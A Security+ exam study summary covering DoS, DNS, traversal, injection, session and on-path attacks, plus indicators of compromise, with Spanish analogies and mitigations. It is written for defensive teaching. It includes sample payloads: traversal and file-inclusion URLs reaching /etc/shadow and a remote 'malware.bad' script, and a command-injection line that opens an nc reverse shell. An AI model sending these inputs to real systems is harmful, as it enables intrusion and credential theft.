# 🛡️ CompTIA Security+ SY0-701 — Dion Training

## Section 19: Malicious Activity | Study Summary

> **Keywords:** DDoS · DNS Attacks · Directory Traversal · Privilege Escalation · Replay · Session Hijacking · On-Path · Injection · IoC · OBJ 2.4

---

## 1. Malicious Activity — Overview

* **Definition:** A broad category of cyber threats where attackers use various techniques to disrupt systems, steal data, or gain unauthorized access to resources.

Malicious activity spans a wide range of attack types, each with distinct mechanisms and impacts. Understanding these attacks — including their **tactics, techniques, and procedures (TTPs)** — is the foundation of effective defense. This section maps to **Security+ Objective 2.4**: given a scenario, analyze indicators of malicious activity.

> *Es como estudiar todos los tipos de delitos antes de convertirte en detective. Si no sabes cómo opera un ladrón, un estafador o un vandalo, no puedes atraparlos ni proteger a nadie de ellos.*

---

## 2. Denial of Service (DoS)

* **Definition:** An attack category that attempts to make a computer, server, or network device unavailable to its intended users by overwhelming it with requests or exploiting vulnerabilities.

DoS is not a single attack but a **category** of attacks. The goal is always the same: deny legitimate users access to a service.

> *Es como bloquear la entrada de un restaurante con cientos de personas falsas que no van a ordenar nada — los clientes reales no pueden entrar.*

### DoS: Flood Attacks

* **Definition:** A DoS subtype that attempts to send more packets to a single server or host than it can handle, exhausting its resources.

**Ping Flood** — floods a target with ICMP echo request packets. Countermeasure: configure firewalls to drop ICMP echo replies.

**SYN Flood** — attacker initiates many TCP sessions using spoofed IP addresses but never completes the three-way handshake, leaving the server waiting with reserved resources until they run out.

| Countermeasure | How it helps |
|---|---|
| **Flood guards** | Detect and block SYN floods at the network boundary |
| **Session timeout** | Server times out half-open connections after 10–30 seconds |
| **IPS** | Detects and responds to SYN floods in progress |

### DoS: Permanent Denial of Service (PDoS)

* **Definition:** An attack that permanently damages a networking device by overwriting or corrupting its firmware, requiring a full hardware reload to recover.

Also called **phlashing**. A simple reboot will not restore the device because the OS/firmware itself has been destroyed.

> *Como quemar el libro de instrucciones de una máquina — no es que esté apagada, es que ya no sabe cómo encenderse.*

### DoS: Fork Bomb

* **Definition:** A DoS attack that creates a rapidly self-replicating number of processes to exhaust a system's CPU and memory resources.

⚠️ A fork bomb is **not a worm** — it does not spread across the network or infect other programs. It only spreads within the processor's cache of the targeted machine.

---

## 3. Distributed Denial of Service (DDoS)

* **Definition:** A DoS attack that uses hundreds or thousands of compromised machines (a botnet) to simultaneously flood a single target, making it far more difficult to stop than a single-source attack.

Individual machines in the botnet (**zombies** or **bots**) typically don't know they're participating. They receive a command from a controller and all send packets to the victim simultaneously.

> *Es como si un jefe del crimen controlara miles de personas en diferentes ciudades y les diera la orden de llamar al mismo número de teléfono al mismo tiempo — la línea colapsa y nadie más puede comunicarse.*

### DDoS: DNS Amplification Attack

* **Definition:** A specialized DDoS where the attacker sends small DNS queries with the victim's spoofed IP address to open DNS servers, which reply with large responses — flooding the victim with amplified traffic.

The attack leverages the **size asymmetry** between a small DNS query and a large DNS response. Combined with a botnet, this generates massive traffic volumes quickly.

### DDoS Mitigation Strategies

| Strategy | Description |
|---|---|
| **Blackholing / Sinkholing** | Routes attacking IPs to a null interface; temporary fix since attackers can change IPs |
| **IPS** | Effective for small-scale attacks; insufficient for large DDoS |
| **Elastic cloud infrastructure** | Scales up to absorb attack traffic; can be costly due to increased usage billing |
| **Specialized CDN providers** | CloudFlare, Akamai — purpose-built for DDoS absorption and content distribution |

---

## 4. DNS Attacks

* **Definition:** A category of attacks that target the Domain Name System to disrupt services, redirect traffic to malicious destinations, or expose network infrastructure information.

DNS is a critical internet component and a prime attack surface. There are five main DNS attack types to know.

> *El DNS es como la guía telefónica de internet. Si alguien la falsifica, envenena o roba, puede redirigir a todas las personas al lugar equivocado sin que se den cuenta.*

### DNS: Cache Poisoning

* **Definition:** An attack that corrupts a DNS resolver's cache with false records, redirecting users to attacker-controlled IP addresses instead of the legitimate destination. Also called DNS spoofing.

**Mitigation:** Use **DNSSEC** (DNS Security Extensions) to add digital signatures to DNS records, verifying authenticity and integrity during lookups.

### DNS: Amplification Attack

* **Definition:** A DDoS-style attack where the attacker sends small DNS queries with the victim's spoofed IP to open resolvers, which send large responses to the victim, overwhelming it with traffic.

**Mitigation:** Rate-limit DNS response traffic and limit the size of DNS responses.

### DNS: Tunneling

* **Definition:** An attack technique that encapsulates non-DNS traffic (such as HTTP or SSH) inside DNS queries and responses over port 53 to bypass firewall rules for command-and-control (C2) or data exfiltration.

DNS traffic is often allowed through firewalls without inspection, making this technique effective. DNS tunneling is a legitimate protocol feature that attackers exploit.

**Mitigation:** Monitor and analyze DNS logs for unusual patterns such as abnormally long queries, high query frequency, or unusual domain names.

### DNS: Domain Hijacking

* **Definition:** An attack where the registration of a domain name is changed without the permission of the legitimate registrant, giving the attacker control over the domain and its traffic. Also called domain theft.

**Mitigation:** Use **domain registry lock services** to prevent unauthorized changes; regularly update and secure registrar account credentials.

### DNS: Zone Transfer Attack

* **Definition:** An attack where the attacker impersonates an authorized system to request a full copy of a DNS zone file, exposing all DNS records and network infrastructure details for use in future reconnaissance.

⚠️ Zone transfer data reveals the full map of a network's DNS structure — a goldmine for pre-attack reconnaissance.

---

## 5. Directory Traversal Attack

* **Definition:** An injection attack that exploits insufficient input validation in a web application to access files and directories outside the intended web document root, potentially reaching sensitive system files.

Also called a **path traversal** attack. If a web server runs on Linux, the attack uses `../` sequences in a URL to navigate up the directory tree. On Windows/IIS systems, `..\ ` (backslash) is used, though Windows often accepts both.

> *Es como estar en un hotel y descubrir que, en vez de usar el elevador normal, puedes subir por las escaleras de servicio y entrar a cualquier habitación — incluyendo la oficina del gerente donde están las llaves maestras.*

**Example URL:**
```
https://diontraining.com/../../../../etc/shadow
```
Each `../` moves one level up the directory tree until reaching the system root, then navigates to the `/etc/shadow` file containing Linux password hashes.

⚠️ Attackers may **encode** traversal sequences to bypass security filters:
- `../` can be encoded as `%2e%2e%2f`

### Directory Traversal: File Inclusion

* **Definition:** A web application vulnerability that allows an attacker to either download arbitrary files from the host system (via directory traversal) or upload and execute malicious scripts to establish a backdoor.

**Remote File Inclusion (RFI)** — attacker injects a URL pointing to a remote malicious script as a parameter value, causing the server to fetch and execute the attacker's code.

```
https://diontraining.com/login.php?user=http://malware.bad/malicious.php
```

**Local File Inclusion (LFI)** — attacker references a file already on the server (e.g., a previously uploaded file) and uses directory traversal to execute it.

```
https://diontraining.com/login.php?user=../../Windows/system32/cmd.exe%00
```
The `%00` is a **null byte** that terminates the string, bypassing filters that would otherwise append `.php` to the request.

⚠️ **Exam tip:** Anytime you see `../` in a URL or log — think **directory traversal**. If the answer choices include both "directory traversal" and "local file inclusion," LFI is a subtype of directory traversal.

---

## 6. Execution and Escalation Attacks

* **Definition:** A class of attacks that exploit vulnerabilities to run unauthorized code on a system, or to gain higher levels of system privilege than originally granted.

> *Es como entrar a un edificio con un pase de visitante y, usando trucos, conseguir la llave maestra que abre todos los pisos — incluyendo el de servidores en el sótano.*

### Arbitrary Code Execution (ACE)

* **Definition:** A vulnerability that allows an attacker to run any code they choose on a target system by exploiting a flaw in an application or process.

### Remote Code Execution (RCE)

* **Definition:** A subtype of arbitrary code execution where the attacker transmits and executes malicious code on a target system from a remote host over a network.

⚠️ **ACE vs RCE:** ACE = attacker can run code on the machine (any vector, touching the target machine). RCE = ACE done **remotely** over the internet. RCE is a specific, more dangerous subset of ACE.

### Privilege Escalation

* **Definition:** An attack where a user or process gains access to resources or permissions beyond what they are normally entitled to, typically aiming for administrator or root-level access.

| Type | Description | Example |
|---|---|---|
| **Vertical Privilege Escalation** | Moving from a lower-privilege user to a higher-privilege level (user → admin/root) | Clicking a phishing link that runs code granting local admin rights |
| **Horizontal Privilege Escalation** | Accessing resources of another user at the same privilege level | Exploiting a vulnerability to read or modify George's files without his permission |

Every process runs under some account's privileges. Code injected into a process **inherits the privileges of that process** — making high-privilege processes prime targets.

### Rootkits

* **Definition:** A class of malware that modifies system files — often at the kernel level — to conceal its presence and maintain persistent, stealthy access to a compromised system.

Rootkits are difficult to detect because they can hide themselves, install additional malware, and maintain persistence across reboots and user logoffs.

Rootkits operate at different privilege **rings**:

| Ring | Level | Description |
|---|---|---|
| **Ring 0** | Kernel mode | Most privileged; full control over the OS |
| **Ring 1–2** | Driver mode | Device driver level access |
| **Ring 3** | User mode | Application level; least privileged |

**Kernel mode rootkit** — embeds at Ring 0; complete system control; most dangerous.

**User mode rootkit** — operates at Ring 3 with admin-level privileges; uses OS features (registry, Task Scheduler) for persistence; easier to detect and remove.

---

## 7. Replay Attacks

* **Definition:** A network attack where a valid data transmission (such as authentication credentials) is intercepted and then maliciously retransmitted later to gain unauthorized access.

The attacker does not need to crack or decrypt the captured data — they simply **replay** the original valid session to the server, which accepts it as legitimate.

> *Es como grabar la combinación que alguien marca en una caja fuerte y luego, cuando se va, marcar tú mismo la misma combinación para abrirla — sin necesidad de saber qué número es cada tono.*

**Example:** An attacker captures your bank login session and replays it hours later to authenticate as you.

| Mitigation | How it helps |
|---|---|
| **Session tokens** | Unique per-session tokens make replaying an old session invalid |
| **Multi-Factor Authentication (MFA)** | OTP codes expire every 30–60 seconds; captured codes cannot be reused |
| **WPA3** | Modern Wi-Fi encryption protocol resistant to replay attacks |

⚠️ **Replay vs Session Hijacking:** In a replay attack the attacker retransmits captured data later. In session hijacking the attacker modifies data in real time during an active session.

---

## 8. Session Hijacking

* **Definition:** A spoofing attack where the attacker steals or forges a user's active session token (often via cookie theft) to impersonate that user and take over their authenticated session.

HTTP is a **stateless protocol** — servers don't remember clients between requests. **Cookies** solve this by storing session state. Because cookies are transmitted with every request, stealing them allows an attacker to impersonate the legitimate user.

> *Es como robarle el brazalete de acceso a alguien en un festival de música. Nadie en la entrada sabe quién eres — solo ven el brazalete y te dejan pasar.*

**Cookie types:**

| Type | Storage | Lifespan |
|---|---|---|
| **Session cookies** | Memory only | Deleted when browser closes |
| **Persistent cookies** | Browser cache | Until manually cleared or expiration date |

### Session Hijacking: Session Prediction

* **Definition:** A session hijacking technique where the attacker attempts to predict the next valid session token by analyzing patterns in how tokens are generated, then uses the predicted token to take over a session.

Tokens must be generated by a **non-predictable algorithm** and must not reveal any information about the client or session.

### Session Hijacking: Cookie Poisoning

* **Definition:** An attack where the contents of a cookie are modified after it has been issued by the web server, exploiting the altered values to trigger vulnerabilities in the web application.

**Mitigations for cookie security:**
- Encrypt cookies during transmission and storage
- Validate all cookie input server-side
- Delete cookies when the session ends
- Set strict expiration times

---

## 9. On-Path Attacks

* **Definition:** An attack where the attacker positions themselves logically between two communicating hosts to transparently capture, monitor, and optionally modify or relay the traffic between them. Formerly called Man-in-the-Middle (MitM).

Common methods to achieve an on-path position include: **ARP poisoning**, **DNS poisoning**, rogue wireless access points, and rogue hub/switches.

> *Es como un cartero corrupto que abre todas tus cartas antes de entregarlas, lee el contenido, puede modificarlo, y luego las sella de nuevo como si nada hubiera pasado.*

**Replay** (in on-path context) — attacker captures valid data and retransmits it immediately or after a delay to authenticate to a service.

**Relay** — attacker inserts themselves as a transparent proxy between client and server, reading and optionally modifying all traffic in real time.

### On-Path: SSL Stripping

* **Definition:** An on-path technique that downgrades a victim's HTTPS connection to plain HTTP by intercepting the initial request and presenting the client with an unencrypted connection, allowing the attacker to read all traffic in cleartext.

The victim's browser shows no padlock and the communication is unencrypted, enabling full data interception.

### On-Path: Downgrade Attack

* **Definition:** An on-path technique that forces a client or server to negotiate a lower, weaker security protocol version (e.g., SSL 2.0 instead of TLS 1.3), making it easier for the attacker to decrypt or crack the intercepted traffic.

⚠️ Downgrade attacks apply beyond SSL/TLS — they can target any negotiated security protocol including Wi-Fi and VPNs. The key is exploiting **backwards compatibility** between protocol versions.

---

## 10. Injection Attacks

* **Definition:** A broad class of attacks where an attacker inserts malicious input through an application interface, causing the application to execute unintended commands or queries.

> *Es como escribir instrucciones falsas en un formulario oficial — si el sistema no valida lo que recibe, ejecuta tus órdenes como si fueran legítimas.*

### Injection: LDAP Injection

* **Definition:** An application attack that targets web applications using LDAP (Lightweight Directory Access Protocol) by injecting malicious LDAP queries through user input fields to manipulate directory lookups, bypass authentication, or expose directory data.

LDAP is commonly used for authentication and storing user/group information. Injecting a wildcard (`*`) into an unsanitized LDAP query can return all users in the directory.

**Mitigation:** Input validation and input sanitization — same principle as SQL injection prevention.

### Injection: Command Injection

* **Definition:** An attack where a threat actor appends shell commands to user-supplied input in a vulnerable web application, causing the server to execute those commands with the web server's own privileges.

**Example:** A web app accepts an IP address and runs `ping [input]`. If an attacker enters:
```
diontraining.com && /bin/sh -i nc hacked.diontraining.com 443
```
The server executes both the ping AND opens a reverse shell to the attacker.

**Mitigation:** Strict input validation — only accept the expected format (e.g., valid IP addresses or domain names) and reject or strip anything else.

### Injection: Process Injection

* **Definition:** A technique where an attacker executes arbitrary code within the memory space of a legitimate, already-running process to inherit that process's permissions and evade security detection.

Because the malicious code runs **under a trusted process**, security tools may not flag it. Execution is masked as normal process activity.

Common process injection methods include: DLL injection, thread execution hijacking, process hollowing, process doppelgänging, asynchronous procedure calls (APC), and portable execution (PE) injection.

**Mitigation:** Endpoint security solutions blocking common attack sequences, security kernel modules, and the principle of **least privilege**.

---

## 11. Indicators of Compromise (IoC)

* **Definition:** Pieces of forensic data that identify potentially malicious activity on a network or system, serving as digital evidence that a security breach may have occurred.

IoCs are clues, not proof. A detected IoC requires investigation to determine whether it represents a true compromise, a system error, legitimate user activity, or a false positive.

> *Son como las huellas de barro en el pasillo de un museo después de que cierra. No confirman que alguien robó algo — pero definitivamente indican que hay que investigar quién entró y por qué.*

### IoC: Account Lockouts

* **Definition:** An IoC that occurs when an account is locked after multiple failed login attempts, potentially indicating a brute force attack attempting to guess credentials.

Lockout policies balance security and usability — too strict (e.g., 3 attempts) causes false positives for legitimate users who mistype. Some systems auto-unlock after a timeout; high-security systems require manual admin intervention.

### IoC: Concurrent Session Usage

* **Definition:** An IoC where multiple active sessions exist simultaneously for a single user account, potentially indicating the account has been compromised and is being used by both the legitimate user and an attacker.

⚠️ Could be a false positive (e.g., user logged in from phone and laptop). Becomes highly suspicious when combined with **impossible travel** — one session in the US, another in Europe at the same time.

### IoC: Blocked Content

* **Definition:** An IoC consisting of repeated attempts to access or download content that has been blocked by security controls, potentially indicating a compromised account being used for data exfiltration or malware download.

### IoC: Impossible Travel

* **Definition:** An IoC that flags authentication events from geographically distant locations within a timeframe that makes physical travel between those locations impossible, strongly indicating credential compromise.

**Example:** Login from New York at 9:00 AM, then login from London at 10:00 AM. A transatlantic flight takes 6+ hours — this is physically impossible.

⚠️ Often appears together with concurrent session usage as both can occur simultaneously during an active account compromise.

### IoC: Resource Consumption

* **Definition:** An IoC characterized by unusual spikes in CPU, memory, GPU, or network bandwidth utilization, potentially indicating malware infection, DDoS participation, or cryptomining activity.

**Example:** A server normally at 20% CPU suddenly jumps to 90%. A workstation with 90% GPU usage while browsing may be enrolled as a **crypto mining zombie**.

### IoC: Resource Inaccessibility

* **Definition:** An IoC where users suddenly cannot access files, databases, or network services — commonly associated with ransomware attacks that encrypt victim data and demand payment for decryption.

The clearest sign: users receive a **ransom note** alongside inaccessible files.

### IoC: Out-of-Cycle Logging

* **Definition:** An IoC consisting of log entries at unusual times (late nights, weekends, holidays) when no legitimate activity is expected, potentially indicating an attacker operating during off-hours to avoid detection.

**Example:** Log activity at 3:00 AM in an office that closes at 6:00 PM.

### IoC: Missing Logs

* **Definition:** An IoC where system logs show unexplained gaps of hours or days, potentially indicating an attacker has deleted log entries to erase evidence of their activity and impede forensic investigation.

⚠️ Attackers routinely delete logs as a **covering tracks** technique. Missing logs are itself strong evidence something malicious occurred.

### IoC: Published/Defacement Notifications

* **Definition:** An IoC where an attacker publicly announces or demonstrates that they have compromised an organization's systems — through website defacement, social media posts, hacker forums, or news articles.

**Example:** A company's homepage is replaced with a message from a hacktivist group claiming responsibility for the breach.

---

## 🔑 Key Terms Glossary

| Term | Definition |
|---|---|
| **DoS** | Denial of Service — attack making a system unavailable to legitimate users |
| **DDoS** | Distributed DoS — same goal but using hundreds/thousands of compromised machines |
| **Botnet** | Network of compromised machines (zombies/bots) controlled by an attacker |
| **SYN Flood** | DoS using incomplete TCP handshakes to exhaust server resources |
| **PDoS** | Permanent DoS — overwrites device firmware; requires full hardware restoration |
| **Fork Bomb** | DoS via explosive process self-replication within a single machine's CPU |
| **Blackholing** | Routing attacker IPs to a null interface to stop DDoS traffic |
| **DNS Cache Poisoning** | Corrupting DNS resolver cache to redirect users to attacker-controlled sites |
| **DNSSEC** | DNS Security Extensions — adds digital signatures to DNS records |
| **DNS Tunneling** | Encapsulating non-DNS traffic in DNS queries to bypass firewall rules |
| **Domain Hijacking** | Unauthorized takeover of a domain's registration |
| **Zone Transfer Attack** | Stealing the full DNS zone file for network reconnaissance |
| **Directory Traversal** | Using `../` sequences to access files outside the web root |
| **RFI** | Remote File Inclusion — injecting a remote malicious script via URL parameter |
| **LFI** | Local File Inclusion — executing an already-uploaded file via directory traversal |
| **ACE** | Arbitrary Code Execution — running attacker-chosen code on a target system |
| **RCE** | Remote Code Execution — ACE performed remotely over a network |
| **Privilege Escalation** | Gaining permissions beyond what was originally granted |
| **Vertical Escalation** | User → admin/root level privilege gain |
| **Horizontal Escalation** | Gaining access to another user's resources at the same privilege level |
| **Rootkit** | Malware that hides at kernel or user level for persistent stealthy access |
| **Kernel Mode Rootkit** | Ring 0 rootkit with complete system control — most dangerous |
| **User Mode Rootkit** | Ring 3 rootkit using OS features (registry, scheduler) for persistence |
| **Replay Attack** | Capturing and retransmitting a valid session to gain unauthorized access |
| **Session Hijacking** | Stealing or forging a session token to impersonate an authenticated user |
| **Cookie Poisoning** | Modifying cookie contents to exploit web application vulnerabilities |
| **Session Prediction** | Guessing future session tokens by analyzing token generation patterns |
| **On-Path Attack** | Interposing between two hosts to capture, relay, or modify traffic (formerly MitM) |
| **SSL Stripping** | Downgrading HTTPS to HTTP to intercept unencrypted traffic |
| **Downgrade Attack** | Forcing negotiation to a weaker security protocol version |
| **LDAP Injection** | Injecting malicious LDAP queries via unsanitized user input |
| **Command Injection** | Appending shell commands to web app input to execute on the server |
| **Process Injection** | Executing code within a legitimate process's memory space |
| **IoC** | Indicator of Compromise — forensic clue suggesting a potential breach |
| **Impossible Travel** | Logins from geographically incompatible locations within an impossible timeframe |
| **Out-of-Cycle Logging** | Log activity at abnormal hours suggesting covert attacker operations |
